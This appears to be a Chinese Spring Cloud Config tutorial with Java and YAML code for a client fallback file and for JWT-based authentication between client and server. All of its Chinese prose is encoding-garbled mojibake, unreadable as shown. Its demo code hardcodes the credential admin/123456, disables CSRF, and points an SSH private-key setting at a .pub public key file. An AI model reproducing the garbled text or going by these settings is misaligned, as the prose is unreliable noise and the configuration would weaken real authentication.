å·¥ç¨‹åˆ›å»º Config Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ä¸Šé¢çš„ config-client-fallback-autoconfigï¼š 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-fallback-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; åˆ›å»º Config Client çš„ä¸»å¯åŠ¨ç±»ï¼š 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} ä¸ºäº†æ›´å¥½åœ°è§‚å¯Ÿæ‹‰å–åˆ°çš„ Git ä¸Šé¢çš„é…ç½®ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºä¸€ä¸ª Controller ç”¨äºè®¿é—®è¿”å›é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå®ä½“ï¼Œç”¨äºæ³¨å…¥è¿œç¨‹é…ç½®ä¸Šçš„ä¿¡æ¯ï¼š 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} æ·»åŠ  Config Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123spring: application: name: config-client æ·»åŠ  Config Client éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼ŒfallbackLocation æŒ‡å®šäº†å›é€€æ–‡ä»¶çš„è·¯å¾„ï¼š 12345678spring: cloud: config: name: config-client #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° uri: http://127.0.0.1:8001 #Config Serverçš„åœ°å€ fallbackLocation: /tmp/config/config-client-dev/ #å›é€€æ–‡ä»¶çš„è·¯å¾„ 4. åˆ›å»º Config Server å·¥ç¨‹åˆ›å»º Config Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Server çš„ä¸»å¯åŠ¨ç±»ï¼Œå¢åŠ  @EnableConfigServer æ³¨è§£ï¼š 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} æ·»åŠ  Config Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 5. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9001/getConfigInfo åè§‚å¯Ÿè¿”å›çš„é…ç½®ä¿¡æ¯ï¼Œä¸æ­¤åŒæ—¶æŸ¥çœ‹æ˜¯å¦åœ¨ç›®å½• /tmp/config/config-client-dev/ ä¸‹æˆåŠŸåˆ›å»ºäº†å›é€€æ–‡ä»¶ fallback.properties å…³é—­ config-serverã€config-client åº”ç”¨ï¼Œç„¶åå•ç‹¬å¯åŠ¨ config-client åº”ç”¨ï¼›è§‚å¯Ÿåœ¨ä¸å¯åŠ¨ config-server çš„æƒ…å†µä¸‹ï¼Œconfig-client åº”ç”¨æ˜¯å¦èƒ½æ­£å¸¸å¯åŠ¨ è‹¥ config-client åº”ç”¨å•ç‹¬å¯åŠ¨æˆåŠŸï¼Œconfig-client åº”ç”¨ä¼šå…ˆå°è¯•å»è¿æ¥ config-serverï¼Œå½“è¿æ¥å¤±è´¥åï¼Œä¼šåŠ è½½æœ¬åœ°çš„å›é€€é…ç½®æ–‡ä»¶ï¼Œæ­¤æ—¶æ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 1234c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://127.0.0.1:8001c.c.c.ConfigServicePropertySourceLocator : Connect Timeout Exception on Url - http://127.0.0.1:8001. Will be trying the next url if availablec.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: I/O error on GET request for "http://127.0.0.1:8001/config-client/dev/master": æ‹’ç»è¿æ¥; nested exception is java.net.ConnectException: æ‹’ç»è¿æ¥c.s.study.ConfigClientApplication : No active profile set, falling back to default profiles: default å®¢æˆ·ç«¯çš„å®‰å…¨è®¤è¯æœºåˆ¶ JWTSpring Cloud Config å®¢æˆ·ç«¯æ”¯æŒä½¿ç”¨ JWT èº«ä»½éªŒè¯æ–¹æ³•ä»£æ›¿æ ‡å‡†çš„åŸºæœ¬èº«ä»½éªŒè¯ï¼Œè¿™ç§æ–¹å¼éœ€è¦å¯¹æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½è¦æ”¹é€ ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼Œå…·ä½“çš„éªŒè¯æ­¥éª¤å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯è´Ÿè½½æˆæƒçš„ RestController å‘é€è¯·æ±‚ï¼Œå¹¶ä¸”å¸¦ä¸Šç”¨æˆ·åå’Œå¯†ç  æœåŠ¡ç«¯æˆåŠŸéªŒè¯ç”¨æˆ·åå’Œå¯†ç åï¼Œè¿”å› Jwt Token å®¢æˆ·ç«¯åŠ è½½æœåŠ¡ç«¯çš„é…ç½®ä¿¡æ¯ï¼Œéœ€è¦åœ¨ Header ä¸­å¸¦ä¸Š Token ä»¤ç‰Œè¿›è¡Œè®¤è¯ i. å‡†å¤‡å·¥ä½œæœ¬ç¤ºä¾‹ç”¨åˆ°ä¸Šé¢çš„ â€œå®¢æˆ·ç«¯å›é€€â€ ç¤ºä¾‹ä¸­ Git ä»“åº“é‡Œçš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlã€‚ ii. åˆ›å»º Config Client Jwt å·¥ç¨‹åˆ›å»º Config Client Jwt å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Client Jwt å·¥ç¨‹çš„è‡ªåŠ¨é…ç½®ç±»ï¼Œ@PostConstruct æ³¨è§£æ˜¯æ‰§è¡Œæ˜¯åœ¨ Servlet æ„é€ å‡½æ•°å’Œ init() æ–¹æ³•æ‰§è¡Œä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å®¹å™¨å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šåˆ›å»ºä¸€ä¸ª RestTemplate å¯¹è±¡ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç å‘é€åˆ° Config Server ç«¯è¿›è¡Œè®¤è¯ï¼›è®¤è¯æˆåŠŸä¼šè¿”å› Tokenï¼Œå¦‚æœè®¤è¯è¿‡ç¨‹ä¸­ç”¨æˆ·åæˆ–è€…æ˜¯å¯†ç é”™è¯¯ï¼Œåˆ™å°†è¿”å›ä¸€ä¸ª 401 è®¤è¯å¤±è´¥çš„é”™è¯¯ç ã€‚å…¶ä¸­ ${spring.cloud.config.usemame}ã€ ${spring.cloud.config.password} ç­‰å‚æ•°æ˜¯é…ç½®åœ¨å®¢æˆ·ç«¯çš„ï¼Œè¿™é‡Œéœ€è¦åˆ›å»º ConfigServicePropertySourceLocator è¿™ä¸ª Bean å¹¶ä¸”è‡ªå®šä¹‰ä¸€ä¸ª RestTemplate å¯¹è±¡éœ€è¦å¸¦ä¸Š Token ä¿¡æ¯ï¼Œè¿™å°±æ˜¯ä»£ç ä¸­çš„ customRestTemplate æ–¹æ³•ã€‚è¿˜éœ€è¦å®šä¹‰ä¸€ä¸ª ClientHttpRequestlnterceptor æ¥å£çš„å®ç°ç±»ï¼Œä¹Ÿå°±æ˜¯ä»£ç ä¸­çš„ GenericRequestHeaderInterceptor ç±»ï¼Œä¸»è¦ç”¨äºæ‹¦æˆªå‘é€åˆ° Config Server è·å–é…ç½®ä¿¡æ¯çš„è¯·æ±‚ï¼Œå°† Token ä¿¡æ¯æ·»åŠ åˆ° HttpServletRequest çš„ Headers ä¸­ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112@Configuration@Order(Ordered.LOWEST_PRECEDENCE)public class ConfigClientBootstrapConfiguration { private static Log logger = LogFactory.getLog(ConfigClientBootstrapConfiguration.class); @Value("${spring.cloud.config.username}") private String jwtUserName; @Value("${spring.cloud.config.password}") private String jwtPassword; @Value("${spring.cloud.config.endpoint}") private String jwtEndpoint; private String jwtToken; @Autowired private ConfigurableEnvironment environment; @PostConstruct public void init() { RestTemplate restTemplate = new RestTemplate(); LoginRequest loginBackend = new LoginRequest(); loginBackend.setUsername(jwtUserName); loginBackend.setPassword(jwtPassword); String serviceUrl = jwtEndpoint; Token token; try { token = restTemplate.postForObject(serviceUrl, loginBackend, Token.class); if (token.getToken() == null) { throw new Exception(); } // è®¾ç½®token setJwtToken(token.getToken()); } catch (Exception e) { e.printStackTrace(); } } public String getJwtToken() { return jwtToken; } public void setJwtToken(String jwtToken) { this.jwtToken = jwtToken; } @Bean public ConfigServicePropertySourceLocator configServicePropertySourceLocator(ConfigClientProperties configClientProperties) { ConfigServicePropertySourceLocator configServicePropertySourceLocator = new ConfigServicePropertySourceLocator(configClientProperties); configServicePropertySourceLocator.setRestTemplate(customRestTemplate()); return configServicePropertySourceLocator; } @Bean public ConfigClientProperties configClientProperties() { ConfigClientProperties clientProperties = new ConfigClientProperties(this.environment); clientProperties.setEnabled(false); return clientProperties; } /** * è‡ªå®šä¹‰restTemplate ï¼Œåœ¨å‘é€çš„æ—¶å€™å¸¦ä¸Štoken * * @return */ private RestTemplate customRestTemplate() { Map&lt;String, String&gt; headers = new HashMap&lt;&gt;(); headers.put("token", "Bearer:" + jwtToken); SimpleClientHttpRequestFactory requestFactory = new SimpleClientHttpRequestFactory(); requestFactory.setReadTimeout((60 * 1000 * 3) + 5000); RestTemplate template = new RestTemplate(requestFactory); if (!headers.isEmpty()) { template.setInterceptors( Arrays.&lt;ClientHttpRequestInterceptor&gt;asList(new GenericRequestHeaderInterceptor(headers))); } return template; } /** * å®¢æˆ·ç«¯è¯·æ±‚è¿‡æ»¤å™¨ */ public static class GenericRequestHeaderInterceptor implements ClientHttpRequestInterceptor { private final Map&lt;String, String&gt; headers; public GenericRequestHeaderInterceptor(Map&lt;String, String&gt; headers) { this.headers = headers; } /** * è¯·æ±‚ä¹‹å‰æ“ä½œçš„æ–¹æ³• * * @param httpRequest * @param bytes * @param clientHttpRequestExecution * @return * @throws IOException */ @Override public ClientHttpResponse intercept(HttpRequest httpRequest, byte[] bytes, ClientHttpRequestExecution clientHttpRequestExecution) throws IOException { headers.entrySet().stream().forEach(header -&gt; { httpRequest.getHeaders().add(header.getKey(), header.getValue()); }); return clientHttpRequestExecution.execute(httpRequest, bytes); } }} åˆ›å»º Config Client Jwt å·¥ç¨‹é‡Œçš„å®ä½“ç±»ï¼Œç”¨äºä¼ é€’ç”¨æˆ·ä¿¡æ¯ï¼š 123456789101112@JsonIgnoreProperties(ignoreUnknown = true)@JsonInclude(JsonInclude.Include.NON_NULL)public class LoginRequest implements Serializable { @JsonProperty private String username; @JsonProperty private String password; //çœç•¥getterã€setteræ–¹æ³•} 123456789@JsonIgnoreProperties(ignoreUnknown = true)@JsonInclude(JsonInclude.Include.NON_NULL)public class Token implements Serializable { @JsonProperty private String token; //çœç•¥getterã€setteræ–¹æ³•} åœ¨ Config Client Jwt å·¥ç¨‹é‡Œåˆ›å»º /src/main/resources/META-INF/spring.factories é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸Šé¢çš„è‡ªåŠ¨é…ç½®ç±»ï¼š 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.config.ConfigClientBootstrapConfiguration iii. åˆ›å»º Config Server å·¥ç¨‹åˆ›å»º Config Server å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.7&lt;/version&gt;&lt;/dependency&gt; åˆ›å»º Config Server å·¥ç¨‹é‡Œçš„ JwtAuthenticationRequest å®ä½“ç±»ï¼Œç”¨äºä¼ é€’ç”¨æˆ·åå’Œå¯†ç ï¼š 12345678910111213141516public class JwtAuthenticationRequest implements Serializable { private String username; private String password; public JwtAuthenticationRequest() { super(); } public JwtAuthenticationRequest(String username, String password) { this.setUsername(username); this.setPassword(password); } //çœç•¥getterã€setteræ–¹æ³•} åˆ›å»º Config Server å·¥ç¨‹é‡Œçš„ JwtAuthenticationResponse å®ä½“ç±»ï¼Œç”¨äºè¿”å› Token ä¿¡æ¯ï¼š 12345678910public class JwtAuthenticationResponse implements Serializable { private final String token; public JwtAuthenticationResponse(String token) { this.token = token; } //çœç•¥getterã€setteræ–¹æ³•} åˆ›å»º Config Server å·¥ç¨‹é‡Œçš„ JwtUser å®ä½“ç±»ï¼Œç”¨äºè¿”å› JWT ç”¨æˆ·è®¤è¯ä¿¡æ¯ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class JwtUser implements UserDetails { private final String username; private final String password; private final Collection&lt;? extends GrantedAuthority&gt; authorities; public JwtUser(String username, String password, Collection&lt;? extends GrantedAuthority&gt; authorities) { this.username = username; this.password = password; this.authorities = authorities; } @Override public String getUsername() { return username; } @JsonIgnore @Override public boolean isAccountNonExpired() { return true; } @JsonIgnore @Override public boolean isAccountNonLocked() { return true; } @JsonIgnore @Override public boolean isCredentialsNonExpired() { return true; } @JsonIgnore @Override public String getPassword() { return password; } @Override public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() { return authorities; } @Override public boolean isEnabled() { return true; } @Override public String toString() { return "JwtUser [username=" + username + ", password=" + password + ", authorities=" + authorities + "]"; }} åˆ›å»º Config Server å·¥ç¨‹é‡Œçš„ JWT Token è®¤è¯è¿‡æ»¤å™¨ï¼š 12345678910111213141516171819202122232425262728public class JwtAuthenticationTokenFilter extends UsernamePasswordAuthenticationFilter { @Autowired private UserDetailsService userDetailsService; @Autowired private JwtTokenUtil jwtTokenUtil; private final String tokenHeader = "token"; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { HttpServletRequest httpRequest = (HttpServletRequest) request; String authToken = httpRequest.getHeader(tokenHeader); String username = jwtTokenUtil.getUsernameFromToken(authToken); if (username != null &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == null) { UserDetails userDetails = this.userDetailsService.loadUserByUsername(username); if (jwtTokenUtil.validateToken(authToken, userDetails)) { UsernamePasswordAuthenticationToken auth = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities()); auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(httpRequest)); SecurityContextHolder.getContext().setAuthentication(auth); } } chain.doFilter(request, response); }} åˆ›å»º Config Server å·¥ç¨‹é‡Œçš„ JWT å·¥å…·ç±»ï¼Œä¸»è¦ç”¨äºæ ¹æ®ä¼ é€’è¿‡æ¥çš„ç”¨æˆ·ä¿¡æ¯ç”Ÿæˆ JWT çš„ Tokenï¼Œæˆ–è€…æ˜¯éªŒè¯è¯·æ±‚çš„ Token æ˜¯å¦åˆæ³•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104@Componentpublic class JwtTokenUtil implements Serializable { private static final long serialVersionUID = -8652360919584431721L; private static final String CLAIM_KEY_USERNAME = "sub"; private static final String CLAIM_KEY_AUDIENCE = "audience"; private static final String CLAIM_KEY_CREATED = "created"; private static final String AUDIENCE_UNKNOWN = "unknown"; private static final String AUDIENCE_WEB = "web"; private Key secret = MacProvider.generateKey(); private Long expiration = (long) 120; // 2 minutes /** * ç”Ÿæˆtoken * * @param userDetails * @return */ public String generateToken(JwtUser userDetails) { Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;(); claims.put(CLAIM_KEY_USERNAME, userDetails.getUsername()); claims.put(CLAIM_KEY_AUDIENCE, AUDIENCE_WEB); claims.put(CLAIM_KEY_CREATED, new Date().getTime() / 1000); return generateToken(claims); } /** * jwt å®é™…ç”Ÿæˆtoken * * @param claims * @return */ private String generateToken(Map&lt;String, Object&gt; claims) { return Jwts.builder().setClaims(claims).setExpiration(generateExpirationDate()) .signWith(SignatureAlgorithm.HS512, secret).compact(); } private Date generateExpirationDate() { return new Date(System.currentTimeMillis() + expiration * 1000); } public String getUsernameFromToken(String token) { if (token == null) { return null; } String username; try { final Claims claims = getClaimsFromToken(token); username = claims.getSubject(); } catch (Exception e) { username = null; } return username; } private Claims getClaimsFromToken(String token) { Claims claims; final String tokenClean = token.substring(7); // remove "Bearer:" try { claims = Jwts.parser().setSigningKey(secret).parseClaimsJws(tokenClean).getBody(); } catch (Exception e) { claims = null; } return claims; } /** * æ ¡éªŒtokençš„åˆæ³•æ€§ * * @param token * @param userDetails * @return */ public Boolean validateToken(String token, UserDetails userDetails) { JwtUser user = (JwtUser) userDetails; final String username = getUsernameFromToken(token); return (username.equals(user.getUsername()) &amp;&amp; !isTokenExpired(token)); } private Boolean isTokenExpired(String token) { final Date expiration = getExpirationDateFromToken(token); return expiration.before(new Date()); } public Date getExpirationDateFromToken(String token) { Date expiration; try { final Claims claims = getClaimsFromToken(token); expiration = claims.getExpiration(); } catch (Exception e) { expiration = null; } return expiration; }} åˆ›å»º Config Server å·¥ç¨‹é‡Œçš„ JWT è®¤è¯ç«¯ç‚¹ç±»ï¼Œä¸»è¦ç”¨äºåœ¨è®¤è¯è¿‡ç¨‹ä¸­ï¼Œè‹¥è®¤è¯æœªèƒ½é€šè¿‡ç›´æ¥è¿”å› 401 çŠ¶æ€ç ï¼š 123456789@Componentpublic class JwtAuthenticationEntryPoint implements AuthenticationEntryPoint, Serializable { @Override public void commence(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AuthenticationException e) throws IOException, ServletException { // æ²¡æœ‰è®¤è¯é€šè¿‡å°†æ·»åŠ 401 httpServletResponse.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Unauthorized"); }} åˆ›å»º Config Server å·¥ç¨‹é‡Œçš„è´¦å·éªŒè¯ç±»ï¼Œä¸»è¦ç”¨äºå®¢æˆ·ç«¯çš„éªŒè¯ç”¨æˆ·åå’Œå¯†ç ï¼š 12345678910111213141516171819202122232425@Servicepublic class MemberServiceImpl implements UserDetailsService { private static final PasswordEncoder BCRYPT = new BCryptPasswordEncoder(); @Value("${spring.security.user.name}") private String hardcodedUser; @Value("${spring.security.user.password}") private String password; @Override public JwtUser loadUserByUsername(String username) throws UsernameNotFoundException { // å¯¹å¯†ç è¿›è¡ŒåŠ å¯† String hardcodedPassword = BCRYPT.encode(password); if (username.equals(hardcodedUser) == false) { throw new UsernameNotFoundException(String.format("No user found with username \'%s\'.", username)); } else { SimpleGrantedAuthority simpleGrantedAuthority = new SimpleGrantedAuthority("ROLE_USER"); List&lt;GrantedAuthority&gt; grantedAuthorityList = new ArrayList&lt;GrantedAuthority&gt;(); grantedAuthorityList.add(simpleGrantedAuthority); return new JwtUser(hardcodedUser, hardcodedPassword, grantedAuthorityList); } }} åˆ›å»º Config Server å·¥ç¨‹çš„ WebAuthenticationDetailsSourceImpl ç±»ï¼Œç”¨äºå°†ä¼ é€’è¿‡æ¥çš„å¯¹è±¡æ•°æ®å°è£…åˆ° JwtAuthenticationRequest é‡Œé¢ï¼Œè¯¥ç±»è´Ÿè´£å°†æ•°æ®å°è£…æˆ JSON æ ¼å¼åè¿”å›ç»™å®¢æˆ·ç«¯ï¼š 12345678910111213141516171819202122232425@Componentpublic class WebAuthenticationDetailsSourceImpl implements AuthenticationDetailsSource&lt;HttpServletRequest, JwtAuthenticationRequest&gt; { @Override public JwtAuthenticationRequest buildDetails(HttpServletRequest request) { Gson gson = new Gson(); String json = new String(); String output = new String(); BufferedReader br; StringBuffer buffer = new StringBuffer(16384); JwtAuthenticationRequest jwtAuthenticationRequest = new JwtAuthenticationRequest(); try { br = new BufferedReader(new InputStreamReader(request.getInputStream())); while ((output = br.readLine()) != null) { buffer.append(output); } json = buffer.toString(); jwtAuthenticationRequest = gson.fromJson(json, JwtAuthenticationRequest.class); } catch (IOException e) { e.printStackTrace(); } return jwtAuthenticationRequest; }} åˆ›å»º Config Server å·¥ç¨‹çš„ AuthenticationRestController ç±»ï¼Œä¸»è¦ç”¨äºé¢å‘ Token ç»™å®¢æˆ·ç«¯ï¼š 1234567891011121314151617181920212223242526272829@RestControllerpublic class AuthenticationRestController { @Autowired private AuthenticationManager authenticationManager; @Autowired private JwtTokenUtil jwtTokenUtil; @Autowired private MemberServiceImpl userDetailsService; @Autowired private WebAuthenticationDetailsSourceImpl webAuthenticationDetailsSource; @RequestMapping(value = "/auth", method = RequestMethod.POST) public ResponseEntity&lt;?&gt; createAuthenticationToken(HttpServletRequest request) { JwtAuthenticationRequest jwtAuthenticationRequest = webAuthenticationDetailsSource.buildDetails(request); UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(jwtAuthenticationRequest.getUsername(), jwtAuthenticationRequest.getPassword()); authToken.setDetails(jwtAuthenticationRequest); Authentication authenticate = authenticationManager.authenticate(authToken); SecurityContextHolder.getContext().setAuthentication(authenticate); JwtUser userDetails = userDetailsService.loadUserByUsername(jwtAuthenticationRequest.getUsername()); final String token = jwtTokenUtil.generateToken(userDetails); return ResponseEntity.ok(new JwtAuthenticationResponse(token)); }} åˆ›å»º Config Server å·¥ç¨‹çš„ SecurityConfig ç±»ï¼Œä¸»è¦ä½œç”¨æ˜¯è¿›è¡Œå®‰å…¨è®¤è¯å’Œ Token çš„è¿‡æ»¤ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960@Configuration@EnableWebSecurity@EnableGlobalMethodSecurity(prePostEnabled = true)public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private JwtAuthenticationEntryPoint unAuthorizedHandler; @Autowired private WebAuthenticationDetailsSourceImpl webAuthenticationDetailsSource; @Bean @ConditionalOnMissingBean(AuthenticationManager.class) public UsernamePasswordAuthenticationFilter usernamePasswordAuthenticationFilter(AuthenticationManager authenticationManager) throws Exception { UsernamePasswordAuthenticationFilter usernamePasswordAuthenticationFilter = new UsernamePasswordAuthenticationFilter(); usernamePasswordAuthenticationFilter.setAuthenticationManager(authenticationManager); usernamePasswordAuthenticationFilter.setAuthenticationDetailsSource(webAuthenticationDetailsSource); return usernamePasswordAuthenticationFilter; } @Bean public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } @Bean public JwtAuthenticationTokenFilter authenticationTokenFilter() throws Exception { JwtAuthenticationTokenFilter jwtAuthenticationTokenFilter = new JwtAuthenticationTokenFilter(); jwtAuthenticationTokenFilter.setAuthenticationManager(authenticationManager()); jwtAuthenticationTokenFilter.setAuthenticationDetailsSource(webAuthenticationDetailsSource); return jwtAuthenticationTokenFilter; } @Override protected void configure(HttpSecurity httpSecurity) throws Exception { httpSecurity .csrf().disable() .exceptionHandling().authenticationEntryPoint(unAuthorizedHandler) .and() .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() .antMatchers(HttpMethod.GET, "/").permitAll() .antMatchers("/auth/**").permitAll() .anyRequest().authenticated().and().formLogin() .authenticationDetailsSource(webAuthenticationDetailsSource) .permitAll(); // æ·»åŠ è‡ªå®šä¹‰çš„jwtå®‰å…¨è¿‡æ»¤çš„filter httpSecurity.addFilterBefore(authenticationTokenFilter(), UsernamePasswordAuthenticationFilter.class); httpSecurity.headers().cacheControl(); }} iiii. åˆ›å»º Config Client å·¥ç¨‹è¿™é‡Œçš„ Config Client å·¥ç¨‹ä¸ä¸Šé¢ â€œå®¢æˆ·ç«¯å›é€€â€ ç¤ºä¾‹ä¸­çš„ Config Client å·¥ç¨‹çš„ä»£ç ä¸€è‡´ï¼Œç›´æ¥æ‹·è´ä¸€ä»½å³å¯ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ Config Client é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ä¸Šé¢çš„ config-client-jwt ä¾èµ–ï¼š 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-jwt&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Config Client é‡Œçš„ application.yml é…ç½®æ–‡ä»¶ï¼š 123spring: application: name: config-client Config Client é‡Œçš„ bootstrap.yml é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­ password å’Œ username æ˜¯ Config Server ç«¯é…ç½®éœ€è¦çš„è®¤è¯ç”¨æˆ·ä¿¡æ¯ï¼Œendpoint æ˜¯ä¸€ä¸ª Config Server è®¿é—®éªŒè¯æˆæƒçš„åœ°å€ï¼š 1234567891011spring: cloud: config: name: config-client #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° uri: http://127.0.0.1:8001 #Config Serverçš„åœ°å€ username: admin password: 123456 enabled: false endpoint: http://localhost:8001/auth #æŒ‡å®šJWTçš„è®¤è¯åœ°å€ iiiii. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9090/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environmentï¼Œè¯´æ˜ä¸€åˆ‡è¿è¡Œæ­£å¸¸ config-client ç‰¹æ„å¡«å†™é”™è¯¯çš„è´¦å·ä¿¡æ¯ï¼Œç„¶åé‡æ–°å¯åŠ¨ config-client åº”ç”¨ï¼Œè§‚å¯Ÿæ§åˆ¶å°æ˜¯å¦ä¼šå‡ºç° 401 æˆæƒå¤±è´¥çš„é”™è¯¯ ä¸‹ç¯‡ - Config å…¥é—¨æ•™ç¨‹ï¼ˆé«˜çº§ç¯‡ï¼‰ Config å…¥é—¨æ•™ç¨‹ - é«˜çº§ç¯‡ var isMobile = 